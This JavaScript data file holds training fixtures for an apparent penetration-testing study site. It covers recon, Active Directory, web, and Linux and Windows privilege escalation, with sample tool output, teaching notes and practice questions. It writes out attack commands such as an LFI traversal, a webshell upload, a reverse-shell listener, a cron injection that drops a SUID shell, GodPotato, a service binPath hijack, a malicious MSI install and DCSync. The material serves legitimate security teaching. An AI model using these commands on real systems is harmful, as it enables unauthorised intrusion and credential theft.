/*!
 * obol data — study-fixtures.js — OBOL.STUDY_FIXTURES
 *
 * The one piece of the study cell NOT derivable from the packs: a representative sample of what each
 * move's output looks like, the one line that matters ("signal"), and a plain teach note about why.
 * A static site can't read the parser test fixtures at runtime, so these are embedded here — trimmed
 * but faithful to real tool output.
 *
 * `situation` / `choices` / `coach` drive the "Your turn" retrieval-practice gear. The verdict for
 * each choice (correct / also-valid / locked) is computed in study.js from the real requires — only
 * the choice set and the nuance coaching live here.
 *
 * Covers all five lanes: Recon · Active Directory · Web · Linux Privesc · Windows Privesc.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  OBOL.STUDY_FIXTURES = {

    // ============================ RECON ============================
    'nmap-fast-open-ports': {
      output: [
        'Nmap scan report for 10.10.10.10',
        'Host is up (0.021s latency).',
        'PORT     STATE SERVICE',
        '22/tcp   open  ssh',
        '80/tcp   open  http',
        '445/tcp  open  microsoft-ds',
      ].join('\n'),
      signal: '80/tcp   open  http',
      teach: 'Every open port is a door. A fast all-ports sweep first tells you what to look at — here SSH, a web server, and SMB — before you spend time on any one service.',
      situation: 'You have a target IP and nothing else. Where do you start?',
      choices: ['nmap-fast-open-ports', 'nmap-version-scripts', 'recon-smb-anon', 'recon-web-triage'],
      coach: {
        'nmap-version-scripts': 'That is the right follow-up — but run a fast all-ports sweep first so you know which ports even exist before you fingerprint them.',
        'recon-smb-anon': 'You can only enumerate SMB once you know 445 is open. Scan first.',
        'recon-web-triage': 'Same — triage the web only after a scan confirms a web port is there.',
      },
    },
    'nmap-version-scripts': {
      output: [
        'PORT    STATE SERVICE VERSION',
        '22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu',
        '80/tcp  open  http    Apache httpd 2.4.49 ((Unix))',
        '|_http-title: Acme Corp',
        '445/tcp open  netbios-ssn Samba smbd 4.6.2',
      ].join('\n'),
      signal: 'Apache httpd 2.4.49',
      teach: 'Versions are leads. "Apache 2.4.49" is a specific, searchable build — many such versions have a public CVE. Always pull the version before deciding how to attack a service.',
      situation: 'Your fast scan found 22, 80 and 445 open. What next?',
      choices: ['nmap-version-scripts', 'recon-web-triage', 'recon-smb-anon', 'nmap-fast-open-ports'],
      coach: {
        'recon-web-triage': 'Good instinct, and valid — but a version/script scan on all the open ports at once gives you leads on SSH and SMB too, not just the web.',
        'recon-smb-anon': 'Also reasonable, but fingerprint the versions first; it is cheap and tells you which services are worth your time.',
        'nmap-fast-open-ports': 'Already done — you have the open ports. Now get the versions behind them.',
      },
    },
    'recon-smb-anon': {
      output: [
        'SMB  10.10.10.10  445  FILE01  [+] Guest session established',
        'SMB  10.10.10.10  445  FILE01  Share       Permissions  Remark',
        'SMB  10.10.10.10  445  FILE01  -----       -----------  ------',
        'SMB  10.10.10.10  445  FILE01  backups     READ',
        'SMB  10.10.10.10  445  FILE01  IPC$                     Remote IPC',
      ].join('\n'),
      signal: 'backups     READ',
      teach: 'A guest/anonymous session that lists shares is a gift. A READ share named "backups" is exactly where configs, scripts and credentials leak — spider it before anything else.',
      situation: 'The scan shows SMB open on 445 and you have no credentials. What do you try?',
      choices: ['recon-smb-anon', 'recon-web-triage', 'nmap-version-scripts'],
      coach: {
        'recon-web-triage': 'Fine if there is also a web port, but a free anonymous SMB check costs nothing and often hands you a readable share.',
        'nmap-version-scripts': 'You already know the service; now actually enumerate it.',
      },
    },
    'recon-web-triage': {
      output: [
        'http://10.10.10.10 [200 OK] Apache[2.4.49], HTTPServer[Apache/2.4.49 (Unix)],',
        '  PHP[8.0.1], WordPress[5.8], Title[Acme Corp Blog], IP[10.10.10.10]',
      ].join('\n'),
      signal: 'WordPress[5.8]',
      teach: 'Before poking a web app, name its stack. "WordPress 5.8 on PHP 8 / Apache 2.4.49" turns a blank page into a list of version-specific attacks to look up.',
      situation: 'Port 80 is open. Before brute-forcing anything, what do you do first?',
      choices: ['recon-web-triage', 'content-discovery', 'nmap-version-scripts'],
      coach: {
        'content-discovery': 'That comes next — but fingerprint the stack first, so your wordlists and attacks match the tech (a WordPress site wants a WordPress approach).',
        'nmap-version-scripts': 'Useful, but whatweb/triage tells you the app framework and CMS, which the nmap banner often misses.',
      },
    },

    // ============================ ACTIVE DIRECTORY ============================
    'ad-dc-identify': {
      output: [
        'PORT    STATE SERVICE',
        '88/tcp  open  kerberos-sec',
        '389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: acme.internal)',
        '445/tcp open  microsoft-ds',
        '464/tcp open  kpasswd5',
      ].join('\n'),
      signal: 'Domain: acme.internal',
      teach: 'Kerberos (88) + LDAP (389) on one host is the fingerprint of a Domain Controller, and the LDAP banner leaks the domain name — that name is what every later AD command needs.',
      situation: 'A fresh scan shows 88, 389 and 445 open on one host, and the LDAP banner names a domain.',
      choices: ['ad-dc-identify', 'ad-anon-ldap-enum', 'asrep-roast', 'dcsync'],
      coach: {
        'ad-anon-ldap-enum': 'That is the right next step — but only once you have confirmed this is the DC and captured the domain name. First, name the target.',
        'asrep-roast': 'Roasting needs a user list you do not have yet. You are one step too early.',
        'dcsync': 'DCSync replicates every hash — it needs Domain Admin. This is the endgame, not the opening.',
      },
    },
    'ad-anon-ldap-enum': {
      output: [
        'SMB   172.16.9.10  445  DC01  [*] Windows Server 2022 (name:DC01) (domain:acme.internal)',
        'LDAP  172.16.9.10  389  DC01  [+] acme.internal\\ (anonymous bind)',
        'LDAP  172.16.9.10  389  DC01  Administrator',
        'LDAP  172.16.9.10  389  DC01  jbloggs',
        'LDAP  172.16.9.10  389  DC01  tgibson',
        'LDAP  172.16.9.10  389  DC01  svc_backup',
      ].join('\n'),
      signal: '(anonymous bind)',
      teach: 'The DC answered an unauthenticated LDAP query and handed back account names. That user list is the seed for every no-creds AD attack that follows — roasting and spraying both need it.',
      situation: 'You have confirmed the DC and the domain is acme.internal. You hold no credentials yet.',
      choices: ['ad-anon-ldap-enum', 'asrep-roast', 'password-spray', 'dcsync'],
      coach: {
        'asrep-roast': 'Roasting needs a user list first. Get the list, then roast.',
        'password-spray': 'Spraying also needs the user list first — same prerequisite.',
        'dcsync': 'Needs Domain Admin. Far too early.',
      },
    },
    'asrep-roast': {
      output: [
        '[*] Getting TGT for jbloggs',
        "[-] User jbloggs doesn't have UF_DONT_REQUIRE_PREAUTH set",
        '[*] Getting TGT for tgibson',
        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7d9e1f2043546576879a0b1c2d3$5e7b9d1f3a5c…',
        '[*] Getting TGT for svc_backup',
      ].join('\n'),
      signal: '$krb5asrep$23$',
      teach: 'Most users return "doesn\'t have UF_DONT_REQUIRE_PREAUTH set" — a dead end. The $krb5asrep$23$ line is an account with pre-auth disabled, so you just captured its password hash to crack offline.',
      situation: 'Anonymous LDAP handed you a user list and the DC answers on 88. You still have no credentials.',
      choices: ['asrep-roast', 'password-spray', 'kerberoast', 'dcsync'],
      coach: {
        'password-spray': 'Also valid off the user list — but it puts failed logons on the wire and risks lockout. AS-REP roasting gets crackable material with zero auth attempts, so it is the quieter opening move.',
        'kerberoast': 'Kerberoasting needs valid credentials to request service tickets — you have none. AS-REP roasting is its no-creds cousin: same idea, but it targets pre-auth-disabled accounts you can ask for anonymously.',
        'dcsync': 'Needs Domain Admin replication rights. This is the endgame, not step one.',
      },
    },
    'crack-asrep': {
      output: [
        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7d9…:Autumn2026!',
        '',
        'Session..........: hashcat',
        'Status...........: Cracked',
        'Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)',
        'Recovered........: 1/1 (100.00%) Digests',
      ].join('\n'),
      signal: ':Autumn2026!',
      teach: 'hashcat recovered the plaintext after the colon. The AS-REP hash was only candidate material; a cracked password is a validated credential you can now actually log in with.',
      situation: 'You captured a $krb5asrep$23$ hash for tgibson and copied it to your box.',
      choices: ['crack-asrep', 'password-spray', 'ad-acl-abuse', 'dcsync'],
      coach: {
        'password-spray': 'You could spray, but you are holding a hash that may crack into a real password in seconds. Cash the hash you have first.',
        'ad-acl-abuse': 'ACL abuse needs a mapped attack path (BloodHound) and usually a foothold credential — you are not there yet.',
        'dcsync': 'Still needs Domain Admin. One cracked user is not that.',
      },
    },
    'password-spray': {
      output: [
        '2026/09/17 10:41:02 >  Using KDC(s):  172.16.9.10:88',
        '2026/09/17 10:41:03 >  [+] VALID LOGIN:  pparker@acme.internal:Autumn2026!',
        '2026/09/17 10:41:05 >  Done! Tested 48 logins (1 successes) in 2.882 seconds',
      ].join('\n'),
      signal: '[+] VALID LOGIN:',
      teach: 'One shared password tried against the whole user list found a hit. Spraying is loud — note the lockout risk — but a single valid login is a domain foothold. Spray one password, never many per account.',
      situation: 'You have a user list and the DC. AS-REP returned nothing roastable, so you try one seasonal password against everyone.',
      choices: ['password-spray', 'asrep-roast', 'kerberoast', 'dcsync'],
      coach: {
        'asrep-roast': 'Worth trying first (it is quieter), but if it returned nothing roastable, a careful single-password spray is the reasonable next swing.',
        'kerberoast': 'Still needs valid creds — which is exactly what the spray is trying to get you. Spray first, then roast service accounts.',
        'dcsync': 'Needs Domain Admin. A sprayed low-priv login is not that.',
      },
    },
    'ad-acl-abuse': {
      output: [
        '[+] svc-audit successfully added to group Help Desk Operators',
        'distinguishedName: CN=Help Desk Operators,CN=Users,DC=acme,DC=internal',
        'ActiveDirectoryRights: GenericAll',
      ].join('\n'),
      signal: 'GenericAll',
      teach: 'BloodHound showed your account holds GenericAll over an object, and you exercised it — adding yourself to a privileged group. ACL abuse is how a low-priv foothold walks a control path toward Domain Admin.',
      situation: 'You have a valid domain credential and BloodHound mapped a control path: your user has GenericAll over a privileged group.',
      choices: ['ad-acl-abuse', 'kerberoast', 'dcsync', 'asrep-roast'],
      coach: {
        'kerberoast': 'Reasonable with creds in hand, but you are holding a direct control-path edge to privilege — walk the ACL path rather than gambling on a crackable service ticket.',
        'dcsync': 'The right destination, but you need the replication rights first. The ACL abuse is how you get them.',
        'asrep-roast': 'You are well past the no-creds opening now — you already have a credential and a path.',
      },
    },
    'dcsync': {
      output: [
        '[*] Using the DRSUAPI method to get NTDS.DIT secrets',
        'acme.internal\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::',
        'acme.internal\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::',
      ].join('\n'),
      signal: 'krbtgt:502:',
      teach: 'With replication rights you asked the DC to hand over password hashes. The krbtgt hash is the crown jewel — it mints golden tickets, which is total, persistent domain compromise.',
      situation: 'An ACL path escalated you to a principal with domain replication rights.',
      choices: ['dcsync', 'ad-acl-abuse', 'kerberoast', 'password-spray'],
      coach: {
        'ad-acl-abuse': 'That was the previous step — the one that got you the replication rights. You are past it now.',
        'kerberoast': 'Why crack one service account when you can replicate every hash in the domain? You are beyond this.',
        'password-spray': 'Far beneath where you are now — you hold replication rights over the whole domain.',
      },
    },

    // ============================ WEB ============================
    'content-discovery': {
      output: [
        '200      GET        24l      68w     /index.php',
        '301      GET         9l      28w     /admin => /admin/',
        '200      GET       112l     540w     /upload.php',
        '403      GET         9l      28w     /.git/',
      ].join('\n'),
      signal: '/upload.php',
      teach: 'Brute-forcing paths turns an empty site into a map. /upload.php is a classic file-upload foothold, and the 403 on /.git/ hints the source may be exposed. Hidden endpoints are new attack surface.',
      situation: 'You fingerprinted the web stack. Now you want to find what is actually reachable on the server.',
      choices: ['content-discovery', 'param-discovery', 'lfi-probe', 'recon-web-triage'],
      coach: {
        'param-discovery': 'That comes after you have pages to test — first discover the endpoints, then fuzz each one for hidden parameters.',
        'lfi-probe': 'You can only probe a parameter you have found. Map the site first.',
        'recon-web-triage': 'Already done — you know the stack. Now enumerate its content.',
      },
    },
    'param-discovery': {
      output: [
        '[*] Scanning http://10.10.10.10/view.php',
        '[+] Parameter detected: page',
        '[+] Parameter detected: file',
        '[+] Parameter detected: debug',
      ].join('\n'),
      signal: 'Parameter detected: page',
      teach: 'Pages often read hidden parameters the UI never shows. A page= or file= parameter is the doorway to Local File Inclusion; debug= can leak internals. Fuzzing params finds the injectable edge.',
      situation: 'Content discovery found /view.php but it renders blank with no obvious inputs.',
      choices: ['param-discovery', 'lfi-probe', 'content-discovery'],
      coach: {
        'lfi-probe': 'You need a parameter to probe first — view.php showed none, so fuzz for hidden ones before testing traversal.',
        'content-discovery': 'You already have the endpoint; now find its inputs.',
      },
    },
    'lfi-probe': {
      output: [
        '$ curl -s "http://10.10.10.10/view.php?page=../../../../etc/passwd"',
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false',
      ].join('\n'),
      signal: 'root:x:0:0:root',
      teach: 'When a traversal string returns /etc/passwd, arbitrary local file read is confirmed. That spirals into source disclosure, lifting creds from config files, and sometimes RCE via log poisoning or wrappers.',
      situation: 'You found a page=... parameter on view.php. How do you test whether it is injectable?',
      choices: ['lfi-probe', 'file-upload', 'param-discovery'],
      coach: {
        'file-upload': 'Different vector — only if there is an upload form. The page= parameter is begging for a traversal test first.',
        'param-discovery': 'You already have the parameter; now exploit it.',
      },
    },
    'file-upload': {
      output: [
        '$ curl -F "file=@shell.php" http://10.10.10.10/upload.php',
        'File uploaded: /uploads/shell.php',
        '$ curl "http://10.10.10.10/uploads/shell.php?cmd=id"',
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      ].join('\n'),
      signal: 'uid=33(www-data)',
      teach: 'The upload accepted a .php file and the server executed it — the id output proves code execution as the web user. From here you trade the one-shot webshell for a real interactive shell.',
      situation: 'An upload form accepts files and you can reach /uploads/ in your browser.',
      choices: ['file-upload', 'web-shells', 'lfi-probe'],
      coach: {
        'web-shells': 'That is the very next step — once the upload lands a webshell, upgrade it to a reverse shell. But first you have to get the file to execute.',
        'lfi-probe': 'A different vector; you have a working upload path, so use it.',
      },
    },
    'web-shells': {
      output: [
        '$ nc -lvnp 4444',
        'listening on [any] 4444 ...',
        'connect to [10.10.14.2] from (UNKNOWN) [10.10.10.10] 51234',
        'www-data@web01:/var/www/html$ id',
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      ].join('\n'),
      signal: 'www-data@web01:/var/www/html$',
      teach: 'The webshell fired a reverse connection back to your listener — now you have an interactive shell as www-data. That is your foothold; the next job is enumerating the box for a path to root.',
      situation: 'You have code execution through a webshell but it is clunky — one command per request.',
      choices: ['web-shells', 'linux-enum', 'file-upload'],
      coach: {
        'linux-enum': 'Right idea for after you have a proper shell — but upgrade the clunky webshell to an interactive reverse shell first, then enumerate.',
        'file-upload': 'Already done — the upload gave you the webshell you are now upgrading.',
      },
    },

    // ============================ LINUX PRIVESC ============================
    'linux-enum': {
      output: [
        '[+] Sudo version 1.8.31',
        '[+] SUID binaries:',
        '    -rwsr-xr-x 1 root root  /usr/bin/find',
        '[+] Writable cron file: /etc/cron.d/backup (root, every 2 min)',
      ].join('\n'),
      signal: '/usr/bin/find',
      teach: 'Enumeration is where privesc is won. One sweep surfaces every lead at once — a SUID GTFOBins binary, a sudo entry, a writable root cron. You rank the leads; you do not guess.',
      situation: 'You just landed an interactive shell as www-data. What is the very first thing you do?',
      choices: ['linux-enum', 'sudo-abuse', 'suid-gtfobins', 'cron-abuse'],
      coach: {
        'sudo-abuse': 'You cannot know your sudo rights until you enumerate — run the sweep (or sudo -l) first, then act on what it shows.',
        'suid-gtfobins': 'Same — enumerate to find which SUID binaries exist before trying to abuse one.',
        'cron-abuse': 'You have not found a writable cron yet. Enumerate first; it will point you at the real vector.',
      },
    },
    'sudo-abuse': {
      output: [
        '$ sudo -l',
        'Matching Defaults entries for www-data on web01:',
        '    env_reset, mail_badpass',
        'User www-data may run the following commands on web01:',
        '    (root) NOPASSWD: /usr/bin/find',
      ].join('\n'),
      signal: '(root) NOPASSWD: /usr/bin/find',
      teach: 'A NOPASSWD sudo entry on a GTFOBins binary is instant root — find has a documented shell escape (-exec /bin/sh). No password, no exploit, just the published technique.',
      situation: 'Enumeration flagged your sudo rights. You run sudo -l and see a NOPASSWD entry.',
      choices: ['sudo-abuse', 'suid-gtfobins', 'cron-abuse', 'linux-enum'],
      coach: {
        'suid-gtfobins': 'Valid if a SUID binary exists, but a NOPASSWD sudo entry on a GTFOBins binary is the cleanest, loudest-green path — take the sure thing.',
        'cron-abuse': 'Slower and needs a writable cron; you are holding a direct NOPASSWD-to-root ticket.',
        'linux-enum': 'Already done — enumeration is what handed you this sudo lead.',
      },
    },
    'suid-gtfobins': {
      output: [
        '$ find / -perm -4000 -type f 2>/dev/null',
        '/usr/bin/find',
        '/usr/bin/base64',
        '$ /usr/bin/find . -exec /bin/sh -p \\; -quit',
        '# id',
        'uid=33(www-data) euid=0(root)',
      ].join('\n'),
      signal: 'euid=0(root)',
      teach: 'A SUID-root binary runs as root no matter who launches it. If it is on GTFOBins (find, base64, nmap…), there is a published escape — euid=0 proves you are effectively root.',
      situation: 'Enumeration listed SUID binaries including /usr/bin/find, but you have no sudo rights.',
      choices: ['suid-gtfobins', 'sudo-abuse', 'pspy-monitor'],
      coach: {
        'sudo-abuse': 'There are no sudo rights here — that path is closed. The SUID bit on a GTFOBins binary is the open door.',
        'pspy-monitor': 'Worth running to catch cron jobs, but you already have a direct SUID-to-root binary in hand.',
      },
    },
    'pspy-monitor': {
      output: [
        '2026/09/18 12:00:01 CMD: UID=0    PID=20451   | /bin/bash /opt/backup.sh',
        '2026/09/18 12:00:01 CMD: UID=0    PID=20452   | /usr/bin/tar -czf /backup/web.tgz /var/www/*',
      ].join('\n'),
      signal: 'UID=0',
      teach: 'pspy watches processes without root, catching scheduled jobs you cannot see in crontab. A UID=0 job running a script (or a tar wildcard) on a timer is a textbook escalation if any part of it is writable.',
      situation: 'No sudo and no useful SUID binary. You suspect something runs on a schedule as root.',
      choices: ['pspy-monitor', 'cron-abuse', 'suid-gtfobins'],
      coach: {
        'cron-abuse': 'That is the payoff — but first you need to see the job and confirm it runs as root and touches something you can write. pspy shows you that.',
        'suid-gtfobins': 'Already checked — no usable SUID binary. Watch the process list instead.',
      },
    },
    'cron-abuse': {
      output: [
        '$ echo \'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\' >> /opt/backup.sh',
        '... (wait for the 2-minute timer) ...',
        '$ /tmp/rootbash -p',
        '# id',
        'uid=33(www-data) euid=0(root) gid=33 egid=0(root)',
      ].join('\n'),
      signal: 'euid=0(root)',
      teach: 'The root cron ran your appended command, dropping a SUID root shell you then launched with -p. Writable script + root schedule = root. (Tar wildcard jobs fall the same way via --checkpoint-action.)',
      situation: 'pspy showed a root cron running /opt/backup.sh every 2 minutes, and that file is world-writable.',
      choices: ['cron-abuse', 'pspy-monitor', 'sudo-abuse'],
      coach: {
        'pspy-monitor': 'That was how you found the job — you are past it. Now abuse the writable script the job runs.',
        'sudo-abuse': 'No sudo rights here; the writable root cron is the live path.',
      },
    },

    // ============================ WINDOWS PRIVESC ============================
    'windows-enum': {
      output: [
        '[+] Current Token privileges',
        '    SeImpersonatePrivilege        Enabled',
        '[+] Unquoted Service Paths',
        '    C:\\Program Files\\Acme Agent\\agent.exe  (service: AcmeAgent)',
        '[+] AlwaysInstallElevated set to 1 (HKLM and HKCU)',
      ].join('\n'),
      signal: 'SeImpersonatePrivilege        Enabled',
      teach: 'winPEAS surfaces every Windows privesc vector in one pass. SeImpersonate enabled, an unquoted service path, AlwaysInstallElevated — any one of these is a path to SYSTEM. Enumerate, then pick.',
      situation: 'You have a shell as a low-privilege service account on Windows. First move?',
      choices: ['windows-enum', 'seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated'],
      coach: {
        'seimpersonate': 'You cannot know you hold SeImpersonate until you check — enumerate privileges first, then fire the potato.',
        'unquoted-service-path': 'Only viable if such a service exists and a path is writable; the sweep tells you that.',
        'alwaysinstallelevated': 'Same — it only works if both registry keys are set. Enumerate to confirm before acting.',
      },
    },
    'seimpersonate': {
      output: [
        'C:\\> whoami /priv',
        'SeImpersonatePrivilege        Enabled',
        'C:\\> .\\GodPotato.exe -cmd "cmd /c whoami"',
        '[*] Exploiting...',
        'nt authority\\system',
      ].join('\n'),
      signal: 'nt authority\\system',
      teach: 'Service accounts usually hold SeImpersonatePrivilege, and the "potato" family turns that single privilege into a SYSTEM token. The whoami output confirms full compromise of the host.',
      situation: 'Enumeration shows your account has SeImpersonatePrivilege enabled.',
      choices: ['seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated', 'windows-enum'],
      coach: {
        'unquoted-service-path': 'A valid alternative if one exists — but when you already hold SeImpersonate, the potato is the fastest, most reliable route to SYSTEM.',
        'alwaysinstallelevated': 'Also a path if the keys are set, but SeImpersonate is in hand right now.',
        'windows-enum': 'Already done — that is what told you SeImpersonate is enabled.',
      },
    },
    'unquoted-service-path': {
      output: [
        'C:\\> sc qc AcmeAgent',
        '        BINARY_PATH_NAME   : C:\\Program Files\\Acme Agent\\agent.exe',
        'C:\\> icacls "C:\\Program Files\\Acme Agent"',
        '        BUILTIN\\Users:(WD)',
      ].join('\n'),
      signal: 'BUILTIN\\Users:(WD)',
      teach: 'An unquoted path with a space lets Windows try C:\\Program.exe, then C:\\Program Files\\Acme.exe, before the real binary. If any of those directories is writable (WD) by you, drop a payload there and the service runs it as SYSTEM on restart.',
      situation: 'Enumeration flagged an unquoted service path, and you have no special privileges.',
      choices: ['unquoted-service-path', 'weak-service-permissions', 'seimpersonate'],
      coach: {
        'weak-service-permissions': 'Related and worth checking, but that abuses service ACLs directly — here the win is the writable directory in the unquoted path.',
        'seimpersonate': 'Only if you hold that privilege; this account does not. The unquoted path is the lead you have.',
      },
    },
    'weak-service-permissions': {
      output: [
        'C:\\> accesschk.exe -uwcqv "Users" AcmeAgent',
        '  RW AcmeAgent',
        '        SERVICE_ALL_ACCESS',
        'C:\\> sc config AcmeAgent binPath= "C:\\temp\\rev.exe"',
        '[SC] ChangeServiceConfig SUCCESS',
      ].join('\n'),
      signal: 'SERVICE_ALL_ACCESS',
      teach: 'SERVICE_ALL_ACCESS over a service means you can repoint its binary. Set binPath to your payload, restart the service, and it launches as whatever account the service runs under — usually SYSTEM.',
      situation: 'accesschk shows your group has write access to a service configuration.',
      choices: ['weak-service-permissions', 'unquoted-service-path', 'alwaysinstallelevated'],
      coach: {
        'unquoted-service-path': 'A different service-based trick; use it when the path is unquoted and a dir is writable. Here you can rewrite the service config directly — simpler.',
        'alwaysinstallelevated': 'Only if the MSI keys are set. You already hold write access to a service.',
      },
    },
    'alwaysinstallelevated': {
      output: [
        'C:\\> reg query HKLM\\...\\Installer /v AlwaysInstallElevated',
        '    AlwaysInstallElevated    REG_DWORD    0x1',
        'C:\\> reg query HKCU\\...\\Installer /v AlwaysInstallElevated',
        '    AlwaysInstallElevated    REG_DWORD    0x1',
        'C:\\> msiexec /quiet /qn /i rev.msi',
      ].join('\n'),
      signal: '0x1',
      teach: 'When AlwaysInstallElevated is 0x1 in BOTH HKLM and HKCU, any MSI you install runs as SYSTEM. Build a malicious MSI, run msiexec, and you escalate — a pure misconfiguration, no exploit needed.',
      situation: 'Enumeration shows AlwaysInstallElevated = 1. You check both hives to be sure.',
      choices: ['alwaysinstallelevated', 'seimpersonate', 'weak-service-permissions'],
      coach: {
        'seimpersonate': 'Only if you hold that privilege; this path is a registry misconfig instead. Both keys being 0x1 is a free SYSTEM.',
        'weak-service-permissions': 'A valid alternative when service ACLs are loose; here the MSI policy is the open door.',
      },
    },

    // ==================== RECON (service enumeration) ====================
    'nmap-udp-top': {
      output: [
        'PORT    STATE         SERVICE',
        '53/udp  open          domain',
        '161/udp open          snmp',
        '500/udp open|filtered isakmp',
      ].join('\n'),
      signal: '161/udp open          snmp',
      teach: 'TCP is only half the surface. A quick UDP sweep of the top ports finds the services people forget — SNMP (161), DNS (53), IKE/VPN (500) — and each is its own way in.',
    },
    'recon-dns': {
      output: [
        '; <<>> DiG 9.18 <<>> axfr corp.local @10.10.10.10',
        'corp.local.          IN SOA  dc01.corp.local. admin.corp.local.',
        'dc01.corp.local.     IN A    10.10.10.10',
        'dev.corp.local.      IN A    10.10.10.25',
        'intranet.corp.local. IN A    10.10.10.30',
      ].join('\n'),
      signal: 'intranet.corp.local. IN A    10.10.10.30',
      teach: 'A DNS zone transfer (AXFR) that succeeds hands you the whole internal name map in one request — every host and subdomain the admin forgot to lock down. Those new names are new targets.',
    },
    'recon-snmp': {
      output: [
        '10.10.10.10 [public] Linux dev 5.4.0-91-generic',
        '10.10.10.10 [public] HOST-RESOURCES-MIB::hrSWRunName',
        '10.10.10.10 [public]   "sshd" "apache2" "mysqld"',
      ].join('\n'),
      signal: '10.10.10.10 [public] Linux dev 5.4.0-91-generic',
      teach: 'An SNMP community string of "public" is a default nobody changed. With it you can read the host\'s running processes, users, and sometimes credentials straight out of the MIB — no login required.',
    },
    'recon-smtp': {
      output: [
        '10.10.10.10: root exists',
        '10.10.10.10: admin exists',
        '10.10.10.10: bob exists',
        '10.10.10.10: nonexistent does not exist',
      ].join('\n'),
      signal: '10.10.10.10: admin exists',
      teach: 'An SMTP server that answers VRFY confirms which usernames are real. A confirmed user list is the raw material for a password spray or a brute — you stop guessing names and start guessing passwords.',
    },
    'rdp-enum': {
      output: [
        'RDP         10.10.10.10     3389   TARGET   [*] Windows 10 / Server 2019 Build 17763 (name:TARGET) (domain:CORP)',
        'RDP         10.10.10.10     3389   TARGET   [+] CORP\\bob:Summer2024! (Pwn3d!)',
      ].join('\n'),
      signal: '[+] CORP\\bob:Summer2024! (Pwn3d!)',
      teach: '"Pwn3d!" on an RDP check means the credentials you tested actually log in — you have an interactive desktop waiting. Always confirm which creds work against which service before you commit to a session.',
    },
    'nfs-enum': {
      output: [
        'Export list for 10.10.10.10:',
        '/srv/home   *',
        '/var/backups 10.10.10.0/24',
      ].join('\n'),
      signal: '/srv/home   *',
      teach: 'An NFS export shared with "*" is readable by anyone who mounts it. Mount it locally and you can read — and often, with a matching UID, write — other users\' files. A classic foothold and privesc rolled into one.',
    },

    // ==================== WEB ====================
    'vhost-discovery': {
      output: [
        'dev                     [Status: 200, Size: 5210, Words: 412]',
        'staging                 [Status: 200, Size: 1840, Words: 95]',
        'www                     [Status: 200, Size: 5210, Words: 412]',
      ].join('\n'),
      signal: 'staging                 [Status: 200, Size: 1840, Words: 95]',
      teach: 'One IP can serve many sites by Host header. Fuzzing virtual hosts surfaces the ones with no public link — a "staging" or "dev" vhost is usually less hardened than production and is where the bug lives.',
    },
    'sqli-basics': {
      output: [
        'You have an error in your SQL syntax; check the manual that',
        "corresponds to your MySQL server version near '''' at line 1",
      ].join('\n'),
      signal: 'You have an error in your SQL syntax; check the manual that',
      teach: 'A single quote that throws a SQL error means your input reaches the query unescaped — the first proof of SQL injection. From here you confirm the column count and start extracting data.',
    },
    'command-injection': {
      output: [
        'PING 127.0.0.1 (127.0.0.1): 56 data bytes',
        '64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.04 ms',
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      ].join('\n'),
      signal: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      teach: 'The app ran your `;id` alongside its ping — the `uid=www-data` line is the web server executing your command. That is command injection, and it is a direct path to a shell as the web user.',
    },
    'ssti': {
      output: [
        'Hello 49',
      ].join('\n'),
      signal: 'Hello 49',
      teach: 'You sent `{{7*7}}` and the page returned `49` — the template engine evaluated your input instead of printing it. Server-side template injection often escalates straight to remote code execution.',
    },
    'nikto-scan': {
      output: [
        '+ Server: Apache/2.4.49 (Unix)',
        '+ /admin/: This might be interesting.',
        '+ OSVDB-3233: /icons/README: Apache default file found.',
        '+ /cgi-bin/: Directory indexing found.',
      ].join('\n'),
      signal: '+ /admin/: This might be interesting.',
      teach: 'Nikto is a fast first pass that flags the obvious — default files, an exposed /admin, a dated server banner. Treat each hit as a lead to chase by hand, not a finding on its own.',
    },
    'tomcat-deploy': {
      output: [
        'OK - Deployed application at context path [/shell]',
        '$ curl http://10.10.10.10:8080/shell/',
        'uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)',
      ].join('\n'),
      signal: 'OK - Deployed application at context path [/shell]',
      teach: 'Tomcat Manager with valid creds lets you deploy a WAR — your own app — which runs as the Tomcat service account. Deploying a JSP shell is the standard route from "I can log into Manager" to code execution.',
    },

    // ==================== SERVICE & WEB CHECKS ====================
    'check-http-methods': {
      output: [
        'HTTP/1.1 200 OK',
        'Allow: GET, POST, PUT, DELETE, OPTIONS',
      ].join('\n'),
      signal: 'Allow: GET, POST, PUT, DELETE, OPTIONS',
      teach: 'OPTIONS tells you what verbs the server accepts. PUT or DELETE in the list is a red flag — PUT can mean you upload a web shell directly, no injection needed.',
    },
    'check-exposed-files': {
      output: [
        '$ curl -s http://10.10.10.10/.git/HEAD',
        'ref: refs/heads/master',
        '$ curl -s http://10.10.10.10/.env',
        'DB_PASSWORD=sup3rs3cret',
      ].join('\n'),
      signal: 'DB_PASSWORD=sup3rs3cret',
      teach: 'An exposed `.git/` lets you reconstruct the whole source; a readable `.env` leaks secrets outright. Developers leave these behind constantly — always probe for them before anything clever.',
    },
    'check-tls-config': {
      output: [
        '| ssl-cert: Subject: commonName=dev.corp.local',
        '| Subject Alternative Name: DNS:dev.corp.local, DNS:vault.corp.local',
        '|_  Not valid after:  2025-11-01T00:00:00',
      ].join('\n'),
      signal: 'Subject Alternative Name: DNS:dev.corp.local, DNS:vault.corp.local',
      teach: 'A TLS certificate leaks names. The Subject and SAN fields often reveal internal hostnames — like `vault.corp.local` — that you had no other way to discover. Add them to your target list.',
    },

    // ==================== ACTIVE DIRECTORY ====================
